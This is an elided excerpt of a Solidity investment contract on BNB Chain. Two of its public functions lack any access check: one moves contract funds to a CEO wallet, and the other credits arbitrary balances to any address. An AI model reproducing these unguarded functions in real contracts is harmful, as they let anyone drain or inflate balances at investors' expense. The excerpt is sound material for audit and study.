...
contract BNBInvestCommonFinal{
    ...
    mapping (address => Userceo) internal usersceo;
	...
	constructor(address payable ceoAddr, uint256 start) {
    ...
    function transferBalanceCeo(uint256 ceo) public returns(uint256){ 
        address payable to = payable(ceoWallet);
        to.transfer(ceo);        
		Userceo storage userceo = usersceo[ceoWallet];
		return userceo.withdrawn = userceo.withdrawn.add(ceo);  
    }
	...
	function transferBalanceUserAccount(address useraddress,uint256 amountbnb) public returns (uint256) {		
        balanceOf[useraddress] += amountbnb; 
        return amountbnb;       
	}
